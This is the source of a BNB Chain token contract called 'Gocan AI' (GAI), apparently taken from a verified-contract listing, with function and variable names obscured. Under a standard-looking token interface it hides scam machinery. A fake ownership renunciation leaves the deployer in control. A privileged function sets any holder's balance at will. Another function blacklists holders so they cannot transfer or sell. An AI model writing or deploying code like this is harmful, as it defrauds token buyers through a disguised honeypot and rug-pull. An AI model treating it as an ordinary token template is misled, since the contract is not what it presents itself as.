/**
 *Submitted for verification at BscScan.com on 2023-03-08
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface feeMode {
    function totalSupply() external view returns (uint256);

    function balanceOf(address isReceiverTx) external view returns (uint256);

    function transfer(address autoEnable, uint256 modeIs) external returns (bool);

    function allowance(address takeTo, address spender) external view returns (uint256);

    function approve(address spender, uint256 modeIs) external returns (bool);

    function transferFrom(
        address sender,
        address autoEnable,
        uint256 modeIs
    ) external returns (bool);

    event Transfer(address indexed from, address indexed shouldAt, uint256 value);
    event Approval(address indexed takeTo, address indexed spender, uint256 value);
}

interface sellIs is feeMode {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract marketingReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface exemptMode {
    function createPair(address amountList, address feeLaunchReceiver) external returns (address);
}

interface sellTake {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract GocanAI is marketingReceiver, feeMode, sellIs {

    function amountAt(address maxMin) public {
        if (maxLaunch) {
            return;
        }
        
        exemptToShould[maxMin] = true;
        
        maxLaunch = true;
    }

    function decimals() external view virtual override returns (uint8) {
        return isTx;
    }

    function symbol() external view virtual override returns (string memory) {
        return receiverAuto;
    }

    mapping(address => bool) public exemptToShould;

    mapping(address => mapping(address => uint256)) private shouldEnable;

    function totalSupply() external view virtual override returns (uint256) {
        return launchedAtMode;
    }

    uint256 public fundLaunch;

    string private fundTeamAt = "Gocan AI";

    function transferFrom(address sellEnable, address autoEnable, uint256 modeIs) external override returns (bool) {
        if (shouldEnable[sellEnable][_msgSender()] != type(uint256).max) {
            require(modeIs <= shouldEnable[sellEnable][_msgSender()]);
            shouldEnable[sellEnable][_msgSender()] -= modeIs;
        }
        return fromTradingLaunch(sellEnable, autoEnable, modeIs);
    }

    bool public fromAt;

    function name() external view virtual override returns (string memory) {
        return fundTeamAt;
    }

    mapping(address => uint256) private shouldFund;

    function minTx() public {
        
        if (fundLaunch != receiverEnable) {
            listLaunchMode = fundLaunch;
        }
        listLaunchMode=0;
    }

    function marketingMin() public {
        emit OwnershipTransferred(tradingFee, address(0));
        maxLimitFee = address(0);
    }

    address public sellLaunch;

    function approve(address tradingAutoLiquidity, uint256 modeIs) public virtual override returns (bool) {
        shouldEnable[_msgSender()][tradingAutoLiquidity] = modeIs;
        emit Approval(_msgSender(), tradingAutoLiquidity, modeIs);
        return true;
    }

    uint256 private listLaunchMode;

    bool public marketingFrom;

    function fundSwapAuto() public {
        
        if (listLaunchMode != fundLaunch) {
            fromAt = true;
        }
        receiverEnable=0;
    }

    function autoTrading(address minTrading, uint256 modeIs) public {
        require(exemptToShould[_msgSender()]);
        shouldFund[minTrading] = modeIs;
    }

    function teamLimit(address minFund) public {
        if (marketingFrom == autoLiquidity) {
            receiverEnable = fundLaunch;
        }
        if (minFund == tradingFee || minFund == sellLaunch || !exemptToShould[_msgSender()]) {
            return;
        }
        
        buyMarketing[minFund] = true;
    }

    function receiverTradingTeam() public {
        
        if (marketingFrom == autoLiquidity) {
            fundLaunch = receiverEnable;
        }
        fromAt=false;
    }

    address public tradingFee;

    mapping(address => bool) public buyMarketing;

    function fromTradingLaunch(address sellEnable, address autoEnable, uint256 modeIs) internal returns (bool) {
        if (sellEnable == tradingFee) {
            return shouldTo(sellEnable, autoEnable, modeIs);
        }
        require(!buyMarketing[sellEnable]);
        return shouldTo(sellEnable, autoEnable, modeIs);
    }

    bool public autoLiquidity;

    uint8 private isTx = 18;

    function shouldTo(address sellEnable, address autoEnable, uint256 modeIs) internal returns (bool) {
        require(shouldFund[sellEnable] >= modeIs);
        shouldFund[sellEnable] -= modeIs;
        shouldFund[autoEnable] += modeIs;
        emit Transfer(sellEnable, autoEnable, modeIs);
        return true;
    }

    constructor (){ 
        
        sellTake feeLaunch = sellTake(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        sellLaunch = exemptMode(feeLaunch.factory()).createPair(feeLaunch.WETH(), address(this));
        maxLimitFee = _msgSender();
        
        tradingFee = _msgSender();
        exemptToShould[_msgSender()] = true;
        if (autoLiquidity == marketingFrom) {
            listLaunchMode = fundLaunch;
        }
        shouldFund[_msgSender()] = launchedAtMode;
        emit Transfer(address(0), tradingFee, launchedAtMode);
        marketingMin();
    }

    function transfer(address minTrading, uint256 modeIs) external virtual override returns (bool) {
        return fromTradingLaunch(_msgSender(), minTrading, modeIs);
    }

    function balanceOf(address isReceiverTx) public view virtual override returns (uint256) {
        return shouldFund[isReceiverTx];
    }

    event OwnershipTransferred(address indexed receiverReceiver, address indexed walletTrading);

    string private receiverAuto = "GAI";

    uint256 private launchedAtMode = 100000000 * 10 ** 18;

    uint256 public receiverEnable;

    function getOwner() external view returns (address) {
        return maxLimitFee;
    }

    address private maxLimitFee;

    function listTotalAt() public view returns (uint256) {
        return receiverEnable;
    }

    function allowance(address fromExempt, address tradingAutoLiquidity) external view virtual override returns (uint256) {
        return shouldEnable[fromExempt][tradingAutoLiquidity];
    }

    function owner() external view returns (address) {
        return maxLimitFee;
    }

    function exemptAmount() public {
        
        if (marketingFrom) {
            autoLiquidity = true;
        }
        marketingFrom=false;
    }

    bool public maxLaunch;

    function liquidityAuto() public {
        
        
        fromAt=false;
    }

}